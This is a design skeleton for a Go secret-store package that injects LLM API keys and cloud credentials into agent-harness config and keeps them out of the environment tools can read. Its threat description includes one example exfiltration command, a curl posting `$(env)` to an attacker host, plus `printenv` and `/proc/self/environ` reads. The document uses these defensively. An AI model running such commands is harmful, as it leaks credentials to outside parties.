# Init: `pkg/secret` + `secret-store` — pluggable secret injection (skeleton)

**Date:** 2026-07-07
**Status:** **Init / skeleton** — starting point only; the owner will flesh this out. Interfaces and
names below are placeholders to be refined.
**Scope of this init:** get secrets (LLM API keys, cloud creds) **injected into config**, fetched
from a real secret store, so they are held in harness memory and **never placed in the process
environment** that tools (`bash`) can read.
**Explicitly deferred to a later spec:** the reference/handle indirection, run-time substitution at
the sandbox boundary, and output/transcript redaction (the "agent uses a hash, harness substitutes
the real value at tool-run-time" layer). See §7.
**Related:** `session.Runner` / `loop.Config` (where the LLM `inference.Client` — and thus its key —
is injected as config, `2026-07-06-serve-http-session-api-design.md` §3c); `looprig/sandbox` (the
env-scrubbing + future substitution boundary).

## 1. Problem

LLM API keys and cloud credentials (AWS/GCP/Azure/…) are commonly passed as **environment
variables**. Any tool with env access — `bash` above all — can read and exfiltrate them
(`printenv`, `/proc/self/environ`, `curl attacker -d "$(env)"`). We do not want secrets in the
agent's process environment at all.

**Goal (this init):** resolve secrets from a pluggable **secret store** at the composition root,
inject them **into config** (e.g. the `inference.Client`, `loop.Config`, `session.Runner` deps), and
keep them out of the environment. Combined with the sandbox scrubbing every tool's env, this closes
the `printenv`-exfil hole for the highest-value secret (the LLM key) with no reference machinery.

## 2. Architecture — mirror the `storage` split

The established pattern in this repo: a small **contracts** module + separate **backend** modules,
so heavy provider SDKs stay out of core and are chosen at composition (`looprig/storage` +
`natsstore`/`fsstore`). Secrets follow the same shape:

- **`pkg/secret`** (harness) — the consumer-facing surface + the narrow contract the composition
  root depends on to resolve secrets into config. Stdlib-only.
- **`github.com/looprig/secret-store`** (new module, working name) — the leaf **`Source`** contract
  + an in-memory reference source + a conformance suite (`sourcetest`), mirroring
  `storage`/`memstore`/`storetest`. Stdlib-only.
- **Provider backends — separate modules** (so each cloud SDK is pulled only when used):
  - `awssecrets` — AWS Secrets Manager / SSM Parameter Store
  - `gcpsecrets` — GCP Secret Manager
  - `azuresecrets` — Azure Key Vault
  - `vaultsecrets` — HashiCorp Vault
  - `k8ssecrets` — Kubernetes Secrets (mounted files / API)
  - `filesecrets` / `envsecrets` — local dev + "other places" (dotenv/file/static)

```
composition root ── Source (secret-store contract) ──┐
   awssecrets / gcpsecrets / azuresecrets /           ├─► Fetch(ref) → Value
   vaultsecrets / k8ssecrets / filesecrets  (backend) ┘        │
                                                               ▼
   build loop.Config{Client: llm(key), …} / session.Runner deps   (secret in memory, NEVER env)
```

## 3. The contract (sketch — to be refined)

```go
package secret // placeholder

// Ref names a secret in a Source (e.g. "llm/anthropic-api-key"). It is NOT the value.
type Ref string

// Value wraps secret material so it does not leak through logging/formatting: String() and
// GoString() return a redacted marker, never the bytes. Callers read the bytes explicitly.
type Value struct{ b []byte }
func (Value) String() string   { return "secret.Value(REDACTED)" }
func (Value) GoString() string { return "secret.Value(REDACTED)" }
func (v Value) Bytes() []byte  { return v.b }

// Source fetches secret material by reference. Backends implement it; the composition root calls
// it to build config. Errors are typed (NotFound / AccessDenied / Transient) for errors.As.
type Source interface {
	Fetch(ctx context.Context, ref Ref) (Value, error)
}
```

Open: batch fetch, caching/TTL, rotation/watch, and whether `pkg/secret` adds a small resolver over
`Source` (allowlist, required-set validation) or leaves that to the consumer.

## 4. Injection flow (composition root)

```go
// pick a backend (this is the only place a provider SDK is imported)
src := awssecrets.Open(ctx, awsCfg)                    // or vaultsecrets/gcpsecrets/k8ssecrets/…

apiKey, err := src.Fetch(ctx, "llm/anthropic-api-key") // fail-loud on a missing REQUIRED secret
llm := anthropic.New(apiKey.Bytes())                   // key → CLIENT config, never env

runner, _ := session.Compile(loop.Config{Client: llm, /* … */}, store)
// looprig/sandbox scrubs every tool's env of secrets — bash sees none.
```

The secret lives in the client/harness memory for its lifetime and is never exported to the
environment or the agent. The registry could also be injected as a `Runner` dep
(`session.Compile(cfg, store, secret.WithSource(src))`) for tools that legitimately need to resolve
secrets — that overlaps the deferred substitution layer (§7).

## 5. Bootstrapping the store (chicken-and-egg — flag)

The secret store itself needs to authenticate to AWS/GCP/Azure/Vault. That auth must come from the
**platform's ambient identity**, not another long-lived env secret:

- AWS: IAM role (instance/IRSA), GCP: Workload Identity, Azure: Managed Identity,
- K8s: the projected ServiceAccount token, Vault: a Vault Agent / K8s auth method.

So the design assumption is: **one platform-granted identity bootstraps the store; the store fetches
all app secrets.** No app secret sits in env. (Detail this per backend later.)

## 6. Security principles (per CLAUDE.md)

- **Stdlib-first for contracts.** `pkg/secret` and `secret-store` are stdlib-only. Provider backends
  pull cloud SDKs — each is a **separate module requiring explicit dependency approval**, isolated so
  core never links them.
- **Least privilege.** Fetch only the secrets a deployment needs; the store identity is scoped to
  those.
- **Fail loud on startup.** A missing *required* secret aborts construction — never a silent empty.
- **Never log secret values.** The `Value` redaction is the last-line guard; audit *fetches*
  (ref + outcome), never the material.
- **Not in the environment.** The whole point: secrets reach config, never `os.Environ`. Sandbox
  scrubbing enforces the tool side.

## 7. Deferred to the later spec (owner to write)

The **reference / late-substitution** layer that was discussed but is **out of scope here**:

- mint an opaque **handle** per granted secret (random, per-session — *not* a hash of the value);
- tell the agent only the handles; resolve `handle → value` at **tool-run-time** inside the sandbox,
  for authorized (tool, secret) pairs only (least privilege);
- **redact** resolved values from tool output / transcript / logs (best-effort; note base64/encoding
  evasion);
- prefer **capability tools** (secret used inside a narrow tool, never handed to the agent) for
  crown-jewel secrets — strictly stronger than substitution, since arbitrary `bash` can pipe a
  resolved secret to stdout.

## 8. Open questions / TODO

- [ ] Module name: `looprig/secret-store` vs `looprig/secrets` vs `secretkit`; package identifier.
- [ ] Backends as separate modules (SDK isolation) vs sub-packages — confirm the storage-style split.
- [ ] `Source` interface: batch fetch, caching/TTL, rotation/watch, streaming rotation to live clients.
- [ ] Whether `pkg/secret` adds a resolver (allowlist + required-set validation) or leaves it to `cmd`.
- [ ] Per-backend auth/bootstrap detail (IAM/WI/Managed Identity/SA token/Vault agent).
- [ ] Conformance suite (`sourcetest`) shape + an in-memory reference source for tests.
- [ ] Interaction with `session.Runner` deps and the deferred substitution layer (§7) — clean seam.
- [ ] Rotation: what happens to a long-lived `inference.Client` when a fetched key rotates.
